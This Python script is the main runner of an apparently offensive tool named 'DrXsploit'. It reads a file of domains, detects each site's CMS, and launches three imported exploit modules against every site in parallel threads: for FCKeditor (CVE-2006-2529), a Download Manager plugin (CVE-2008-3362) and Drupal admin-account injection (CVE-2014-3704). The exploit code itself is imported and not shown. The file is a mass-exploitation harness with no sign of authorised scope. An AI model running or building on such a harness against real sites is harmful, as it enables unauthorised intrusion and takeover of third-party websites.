import argparse
from concurrent.futures import ThreadPoolExecutor
import logging
import sys
import threading
import time
from core import ensure_directories_exist, read_domains_from_file, Rez
from rich.console import Console
from datetime import datetime
from tools.cms import DetectCMS
from rich.progress import Progress


# -------------- Exploits ------------------
from exploits import CVE_2006_2529_fckeditor
from exploits import CVE_2008_3362Download_Manager
from exploits import CVE_2014_3704Drupal_add_Admin


console = Console()
domains = []

def get_Typer():
    parser = argparse.ArgumentParser(description="DrXsploit", add_help=False)
    parser.add_argument("path", nargs="?", default=None, help="List For Sites")
    parser.add_argument(
        "-h", "--help", dest="help", action="store_true", help="help menu"
    )

    args = parser.parse_args()

    if args.help or not args.path:
        parser.print_help()
        sys.exit()

    logging.basicConfig(level=logging.INFO, format="%(levelname)-8s %(message)s")

    global path
    path = args.path


def banner():
    console.print(
        """

    (              )                              
    )\ )        ( /(             (             )  
    (()/(   (    )\())            )\     (   ( /(  
    /(_))  )(  ((_)\  (   `  )  ((_) (  )\  )\()) 
    (_))_  (()\ __((_) )\  /(/(   _   )\((_)(_))/  
    |   \  ((_)\ \/ /((_)((_)_\ | | ((_)(_)| |_   
    | |) || '_| >  < (_-<| '_ \)| |/ _ \| ||  _|  
    |___/ |_|  /_/\_\/__/| .__/ |_|\___/|_| \__| 
                        |_|                     
                                By [link=https://github.com/DrDataYE]@DrDataYE[/]
    """
    )
    console.print("\n-----------------\n", style="bold")
    console.print("DrDos v1.0", style="bold")
    console.print("By The [link https://github.com/DrDataYE]@DrDataYE", style="bold")
    console.print("Telegram [link https://t.me/LinuxArabe]Kali Linux", style="bold")
    console.print("By Yemen", style="bold")
    console.print("\n-----------------\n", style="bold")
    console.print(
        f"START_TIME: {datetime.now().strftime('%a %b %d %H:%M:%S %Y')}", style="bold"
    )
    console.print(f"Path: {path}", style="bold")
    console.print("\n-----------------\n", style="bold")

    with console.status("[bold green]Wait, loading functions...") as status:
        # headers()
        time.sleep(1)
        status.update("[bold green]Headers loaded, loading user agent...")
        # user_agent()
        time.sleep(1)
        status.update("[bold green]User agent loaded, loading Paths...")
        global domains
        domains = read_domains_from_file(path)
        
        time.sleep(1)
        status.update("[bold green]All functions loaded successfully!")

start_time = time.time()  # Start time of the script


def MultiThreadScan(site):
    
                # status.update(f"[bold white] {site} .....")
                print(f"{site} -> {DetectCMS(site)}")
                li = CVE_2006_2529_fckeditor.Exploit(site, "Wordpress")
                Rez(site,i=li)
                li = CVE_2008_3362Download_Manager.Exploit(site)
                Rez(site,i=li)
                li = CVE_2014_3704Drupal_add_Admin.Exploit(site)
                Rez(site, i=li)
                



if __name__ == "__main__":
    get_Typer()
    banner()
    ensure_directories_exist()
    try:
        with console.status(
            "[bold white]Finishing Attacks CTRL+C to stop ....."
        ) as status:
            # for site in domains:
            #     MultiThreadScan(site)
            with ThreadPoolExecutor(max_workers=5) as executor:
                results = list(executor.map(MultiThreadScan, domains))
    
    except KeyboardInterrupt:
        elapsed_time = time.time() - start_time
        console.print("\n\nAttack stopped by user.", style="bold")
        console.print(f"Elapsed time: {elapsed_time:.2f} seconds", style="bold")